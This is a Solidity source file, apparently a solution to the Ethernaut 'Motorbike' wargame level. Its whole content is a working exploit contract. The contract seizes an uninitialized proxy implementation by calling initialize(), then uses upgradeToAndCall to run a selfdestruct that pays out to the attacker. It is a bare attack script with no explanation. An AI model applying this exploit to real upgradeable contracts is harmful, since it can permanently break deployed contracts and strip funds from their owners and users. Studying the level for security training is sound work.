// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBike {
    function initialize() external;
    function upgradeToAndCall(address, bytes memory) external payable;
    fallback () external payable;
}

contract MotorbikeAttack {
    IBike public ethernautInstance;
    address owner;

    constructor(address payable instanceAddress) payable {
        ethernautInstance = IBike(instanceAddress);
        owner = msg.sender;
    }

    function attack() public {
        ethernautInstance.initialize();

        bytes memory dataToDestroy = abi.encodeWithSelector(this.destroy.selector, "");
        ethernautInstance.upgradeToAndCall(address(this), dataToDestroy);
    }

    function destroy() public payable {
        selfdestruct(payable(owner));
    }
}